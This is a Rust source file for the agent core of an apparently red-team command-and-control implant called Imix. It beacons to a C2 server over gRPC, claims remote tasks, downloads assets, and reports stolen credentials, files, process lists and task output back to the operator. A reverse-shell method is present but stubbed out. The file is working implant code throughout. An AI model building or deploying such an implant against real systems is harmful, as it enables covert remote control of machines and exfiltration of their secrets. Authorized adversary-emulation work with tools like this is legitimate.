use anyhow::{Result, Context};
use tokio::sync::RwLock;
use pb::c2::{self, ClaimTasksRequest};
use pb::config::Config;
use transport::Transport;
use eldritch_libagent::agent::Agent;

use crate::task::TaskRegistry;

pub struct ImixAgent<T: Transport> {
    config: RwLock<Config>,
    transport: RwLock<T>,
}

impl<T: Transport + 'static> ImixAgent<T> {
    pub fn new(config: Config, transport: T) -> Self {
        Self {
            config: RwLock::new(config),
            transport: RwLock::new(transport),
        }
    }

    pub fn get_callback_interval_u64(&self) -> u64 {
        // Blocks on read, but it's fast
        if let Ok(cfg) = self.config.try_read() {
             cfg.info.as_ref().map(|b| b.interval).unwrap_or(5)
        } else {
            5
        }
    }

    // Helper to fetch tasks and return them, so main can spawn
    pub async fn fetch_tasks(&self) -> Result<Vec<pb::c2::Task>> {
         let mut transport = self.transport.write().await;
         let beacon_info = self.config.read().await.info.clone();
         let req = ClaimTasksRequest {
             beacon: beacon_info,
         };
         let response = transport.claim_tasks(req).await
             .context("Failed to claim tasks")?;
         Ok(response.tasks)
    }
}

// Implement the Eldritch Agent Trait
impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
    fn fetch_asset(&self, req: c2::FetchAssetRequest) -> Result<Vec<u8>, String> {
        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .map_err(|e| e.to_string())?;

        rt.block_on(async {
            let mut t = self.transport.write().await;
            // Transport uses std::sync::mpsc::Sender for fetch_asset
            let (tx, rx) = std::sync::mpsc::channel();
            t.fetch_asset(req, tx).await.map_err(|e| e.to_string())?;

            let mut data = Vec::new();
            while let Ok(resp) = rx.recv() {
                data.extend(resp.chunk);
            }
            Ok(data)
        })
    }

    fn report_credential(&self, req: c2::ReportCredentialRequest) -> Result<c2::ReportCredentialResponse, String> {
        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .map_err(|e| e.to_string())?;
        rt.block_on(async {
            let mut t = self.transport.write().await;
            t.report_credential(req).await.map_err(|e| e.to_string())
        })
    }

    fn report_file(&self, req: c2::ReportFileRequest) -> Result<c2::ReportFileResponse, String> {
        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .map_err(|e| e.to_string())?;

        rt.block_on(async {
            let mut t = self.transport.write().await;
            // Transport uses std::sync::mpsc::Receiver for report_file
            let (tx, rx) = std::sync::mpsc::channel();
            tx.send(req).map_err(|e| e.to_string())?;
            drop(tx);
            t.report_file(rx).await.map_err(|e| e.to_string())
        })
    }

    fn report_process_list(&self, req: c2::ReportProcessListRequest) -> Result<c2::ReportProcessListResponse, String> {
        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .map_err(|e| e.to_string())?;
        rt.block_on(async {
            let mut t = self.transport.write().await;
            t.report_process_list(req).await.map_err(|e| e.to_string())
        })
    }

    fn report_task_output(&self, req: c2::ReportTaskOutputRequest) -> Result<c2::ReportTaskOutputResponse, String> {
        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .map_err(|e| e.to_string())?;
        rt.block_on(async {
            let mut t = self.transport.write().await;
            t.report_task_output(req).await.map_err(|e| e.to_string())
        })
    }

    fn reverse_shell(&self) -> Result<(), String> {
         Err("Reverse shell not implemented in imixv2 agent yet".to_string())
    }

    fn claim_tasks(&self, req: c2::ClaimTasksRequest) -> Result<c2::ClaimTasksResponse, String> {
         let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .map_err(|e| e.to_string())?;
        rt.block_on(async {
            let mut t = self.transport.write().await;
            t.claim_tasks(req).await.map_err(|e| e.to_string())
        })
    }

    fn get_transport(&self) -> Result<String, String> {
        Ok("grpc".to_string())
    }

    fn set_transport(&self, _transport: String) -> Result<(), String> {
        Err("Switching transport not supported yet".to_string())
    }

    fn add_transport(&self, _transport: String, _config: String) -> Result<(), String> {
        Err("Adding transport not supported yet".to_string())
    }

    fn list_transports(&self) -> Result<Vec<String>, String> {
        Ok(vec!["grpc".to_string()])
    }

    fn get_callback_interval(&self) -> Result<u64, String> {
        Ok(self.get_callback_interval_u64())
    }

    fn set_callback_interval(&self, interval: u64) -> Result<(), String> {
         let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .map_err(|e| e.to_string())?;
        rt.block_on(async {
            let mut cfg = self.config.write().await;
            if let Some(info) = &mut cfg.info {
                info.interval = interval;
            }
            Ok(())
        })
    }

    fn list_tasks(&self) -> Result<Vec<c2::Task>, String> {
        Ok(TaskRegistry::list())
    }

    fn stop_task(&self, task_id: i64) -> Result<(), String> {
        TaskRegistry::stop(task_id);
        Ok(())
    }
}
